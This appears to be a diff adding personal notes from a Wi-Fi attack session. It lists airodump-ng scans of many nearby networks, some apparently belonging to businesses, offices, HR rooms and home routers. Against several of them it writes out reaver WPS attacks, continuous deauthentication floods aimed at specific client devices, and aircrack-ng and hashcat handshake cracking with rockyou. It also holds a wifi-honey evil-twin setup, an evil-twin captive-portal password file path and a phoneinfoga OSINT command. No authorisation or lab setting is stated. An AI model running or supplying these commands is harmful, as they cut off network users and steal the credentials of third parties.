@@ -1,0 +1,143 @@
+10:7B:44:E9:28:F0  -37       16      132    0   6  130   WPA2 CCMP   PSK  OtogTV                                             
+00:EB:D8:88:80:49  -41        2        0    0   6  360   WPA2 CCMP   PSK  Ysabell-B3L40                                      
+C0:25:2F:9F:21:D4  -41        6        4    0   1  270   WPA2 CCMP   PSK  OdihucaAccessPt                                    
+60:32:B1:87:B3:9A  -42       11        0    0   1  270   WPA2 CCMP   PSK  Acuhido_WIFI                                       
+5E:E9:31:1B:16:13  -42        7        0    0   9  360   WPA3 CCMP   SAE  TP-Link_Guest_1613                                 
+5C:E9:31:1B:16:13  -42        4        4    0   9  360   WPA2 CCMP   PSK  Blacklist                                          
+34:60:F9:65:9E:28  -44        3        0    0   7  360   WPA2 CCMP   PSK  Baxan13|2                                          
+36:60:F9:65:9E:28  -45        3        2    0   7  360   WPA2 CCMP   PSK  Baxan13|2_2.4 
+ 
+ reaver -i wlx00c0cab45c25 -c 1 -e Acuhido_WIFI -b 60:32:B1:87:B3:9A -vv
+ reaver -i wlx00c0cab45c25 -c 1 -e Baxan13|2_2.4 -b 36:60:F9:65:9E:28 -vv
+ 
+ FOR ACUHIDO reaver
+ 
+ =========================================================================================================
+ 
+wifi-honey Acuhido_WIFI 1 wlx00c0cab45c25
+ 
+ =========================================================================================================
+ 
+airodump-ng -c1 -w Acuhido_WIFI -d 60:32:B1:87:B3:9A wlx00c0cab45c25
+aireplay-ng --deauth 0 -a 60:32:B1:87:B3:9A -c client-mac wlx00c0cab45c25
+aircrack-ng "Acuhido_WIFI.cap" -w passwordlist.txt
+ 
+ =========================================================================================================
+	airmon-ng start wlx00c0cab45c25
+	airodump-ng -c7 -w QTP_Globe -d 34:60:F9:31:CC:BB wlx00c0cab45c25
+								60:FB:00:69:63:97
+	airodump-ng -c7 -w Baxan13\|2_2.4 -d 36:60:F9:65:9E:28 wlx00c0cab45c25
+	aireplay-ng --deauth 0 -a 36:60:F9:65:9E:28 -c 60:A5:E2:2E:38:3A wlx00c0cab45c25
+	aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz Baxan13|2_2.4-03.cap
+	36:60:F9:65:9E:28  F6:88:0B:6E:24:3D  -19    1e- 1      0      112 -> jam             
+	36:60:F9:65:9E:28  60:DC:81:64:76:2C  -58    1e- 6e     0        6             
+	36:60:F9:65:9E:28  62:1D:01:C7:D4:0B  -29    0 - 1      0      350 
+	 
+	aireplay-ng --deauth 0 -a 34:60:F9:31:CC:BB -c 60:FB:00:69:63:97 wlx00c0cab45c25
+ =========================================================================================================
+ airodump-ng -c6 -w OtogTV -d 10:7B:44:E9:28:F0 wlx00c0cab45c25
+ aireplay-ng --deauth 0 -a 10:7B:44:E9:28:F0 -c 1C:BF:CE:F4:67:D7 wlx00c0cab45c25
+ aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz OtogTV-03.cap
+ 
+ /root/evil_twin_captive_portal_password-OtogTV.txt
+ =========================================================================================================
+ airodump-ng -c9 -w Blacklist -d 5C:E9:31:1B:16:13 wlx00c0cab45c25
+ aireplay-ng --deauth 0 -a 5C:E9:31:1B:16:13 -c B2:A7:B9:04:E9:C9 wlx00c0cab45c25
+ aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz OtogTV-03.cap
+ =========================================================================================================
+ aircrack-ng -j handshake_file capture.pcap
+ hashcat -m 22000 handshake_file.hccapx -a 3 -1 ?u?l?d ?1?1?1?1?1?1?1?1 --force
+
+=======================================================================
+Shared_Office
+airodump-ng -c9 -w Shared_Office -d 90:9A:4A:DE:31:AD wlx00c0cab45c25
+aireplay-ng --deauth 0 -a 90:9A:4A:DE:31:AD -c D8:D6:68:1C:34:FB wlx00c0cab45c25
+
+=======================================================================
+Shared_Office
+airodump-ng -c9 -w Melita -d 3C:52:A1:AB:84:78  wlx00c0cab45c25
+aireplay-ng --deauth 0 -a 3C:52:A1:AB:84:78 -c EA:AC:24:EE:F6:07 wlx00c0cab45c25
+
+=======================================================================
+FoodDudes
+airodump-ng -c9 -w FoodDudes -d 0C:80:63:1F:0E:DE  wlx00c0cab45c25
+aireplay-ng --deauth 0 -a 0C:80:63:1F:0E:DE -c 16:D5:91:3C:D0:14 wlx00c0cab45c25
+
+================================
+INFOGA
+phoneinfoga serve -p 8080 #copy and paste to launch a web app
+
+
+
+
+
+
+======================================================== JDN ========================================================
+
+ N.         BSSID      CHANNEL  PWR   ENC    ESSID 
+------------------------------------------------------- 
+  1)   18:E8:29:95:57:C0  149    34%   WPA2   BPOSEATS.COM.AP
+  2)*  74:83:C2:C1:89:27   11    67%   WPA2   BPOSEATS.COM.AP
+  3)   74:83:C2:C2:89:27   48    45%   WPA2   BPOSEATS.COM.AP
+  4)   E0:63:DA:07:78:B1    1    56%   WPA2   BPOSEATS.COM.AP
+  5)   BA:DB:AD:BA:5B:AD    3    43%   WPA2   DIRECT-AD-HP Smart Tank 510
+  6)*  AA:64:F1:72:E0:70   36    48%   WPA2   DIRECT-dKMO-ME-886314257RQOT
+  7)   70:0F:6A:40:1E:63   11    47%   WPA2   Eagle_Eye
+  8)   70:79:B3:2B:E9:E3    1    69%   WPA2   Eagle_Eye
+  9)   70:79:B3:2B:E9:EC  100    33%   WPA2   Eagle_Eye
+ 10)   70:0F:6A:40:1E:61   11    48%   WPA2   H2AI
+ 11)   70:79:B3:2B:E9:E1    1    69%   WPA2   H2AI
+ 12)   70:79:B3:2B:E9:EE  100    27%   WPA2   H2AI
+ 13)   5C:62:8B:93:BA:57   48     0%          (Hidden Network)
+ 14)   1E:E8:29:95:57:C0  149    32%   WPA2   (Hidden Network)
+ 15)   22:E8:29:95:57:C0  149    33%   WPA2   (Hidden Network)
+ 16)   26:2F:D0:28:33:B8    5    63%   WPA2   (Hidden Network)
+ 17)   2A:87:BA:A3:B5:FB    7    60%   WPA2   (Hidden Network)
+ 18)   4A:22:54:2D:44:12    8    58%   WPA2   (Hidden Network)
+ 19)   4A:22:54:2D:44:ED    2    79%   WPA2   (Hidden Network)
+ 20)   4A:22:54:AD:1B:83    3    79%   WPA2   (Hidden Network)
+ 21)   5C:62:8B:93:BA:56    2    62%   WPA2   (Hidden Network)
+ 22)   70:0F:6A:40:1E:60   11    50%   WPA2   (Hidden Network)
+ 23)   70:79:B3:2B:E9:E0    1    71%   WPA2   (Hidden Network)
+ 24)   70:79:B3:2B:E9:EF  100    26%   WPA2   (Hidden Network)
+ 25)   7A:83:C2:9E:F9:08   36    23%   WPA2   (Hidden Network)
+ 26)   7A:83:C2:C1:89:27   11    68%   WPA2   (Hidden Network)
+ 27)   7A:83:C2:C2:89:27   48    46%   WPA2   (Hidden Network)
+ 28)   7E:83:C2:C1:89:27   11    71%   WPA2   (Hidden Network)
+ 29)   7E:83:C2:C2:89:27   48    42%   WPA2   (Hidden Network)
+ 30)   9E:A2:F4:26:4B:ED    4    66%   WPA2   (Hidden Network)
+ 31)   E6:63:DA:07:78:B1    1    58%   WPA2   (Hidden Network)
+ 32)*  E8:9C:25:AE:72:A0    9    58%   WPA2   (Hidden Network)
+ 33)   FA:92:BF:0C:F4:4F    6    56%   WPA2   (Hidden Network)
+ 34)   FE:92:BF:0C:F4:4F    6    56%   WPA2   (Hidden Network)
+ 35)*  48:22:54:AD:44:12    8    61%   WPA2    MODER (HR)
+ 36)*  48:22:54:AD:44:ED    2    79%   WPA2   MODER-Training-Room
+ 37)*  48:22:54:AD:1B:83    3    50%   WPA2   MODER
+ 38)   AA:64:F1:70:C7:AE  149    25%   WPA2   MO-ME-796314257 4377
+ 39)   48:F8:B3:27:63:3A    1    77%   WPA2   NC-TrainingRoom
+ 40)   9C:A2:F4:86:4B:ED    4    70%   WPA2   P50 Digital
+ 41)   10:08:1D:05:1E:9C  100    29%   WPA2   PLDTHOMEFIBR51e98
+ 42)   D0:F9:9B:43:C3:66   56    39%   WPA2   PLDTHOMEFIBRv322q
+ 43)   28:87:BA:83:B5:FB    7    54%   WPA2   RetailCloud Services
+ 44)   24:2F:D0:68:33:B8    5    60%   WPA2   RISE_EEIKAIWAINC
+ 45)   0E:90:E5:05:57:2B   48    43%   WPA2   ZIA
+ 
+
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 48:22:54:AD:1B:83   -9       11       29    4   3  540   WPA2 CCMP   PSK  MODER                                                                                                                                                                                                           
+ 74:83:C2:C1:89:27  -28       82        6    0  11  195   WPA2 CCMP   PSK  BPOSEATS.COM.AP                                                                                                     
+ 48:F8:B3:27:63:3A  -28        4        0    0   1  130   WPA2 CCMP   PSK  NC-TrainingRoom                                                                                                   
+ 70:79:B3:2B:E9:E3  -29        7        0    0   1  195   WPA2 CCMP   MGT  Eagle_Eye                                                                                                                                                                                                               
+ 70:79:B3:2B:E9:E1  -34        6        0    0   1  195   WPA2 CCMP   PSK  H2AI                                                                                                       
+ 48:22:54:AD:44:ED  -37       45      635    0   2  540   WPA2 CCMP   PSK  MODER-Training-Room                                                                                                    
+ 28:87:BA:83:B5:FB  -39       15       16    0   7  540   WPA2 CCMP   PSK  RetailCloud Services                                                                                              
+ 48:22:54:AD:44:12  -40       46       97    0   8  540   WPA2 CCMP   PSK   MODER (HR)                                                                                                    
+ D0:F9:9B:43:C3:64  -44        9        0    0   9  270   WPA2 CCMP   PSK  PLDTHOMEFIBRv322q                                                                                                     
+ F4:92:BF:0C:F4:4F  -44        4        0    0   6  195   WPA2 CCMP   PSK  BPOSEATS.COM.AP                                                                                                       
+ 70:0F:6A:40:1E:61  -56       22        0    0  11  195   WPA2 CCMP   PSK  H2AI                                                                                                              
+ 70:0F:6A:40:1E:63  -57       24        0    0  11  195   WPA2 CCMP   MGT  Eagle_Eye
+ 
+ 90:9A:4A:DE:31:AD    2    77%   WPA2   Shared_Office
+ 
+ 
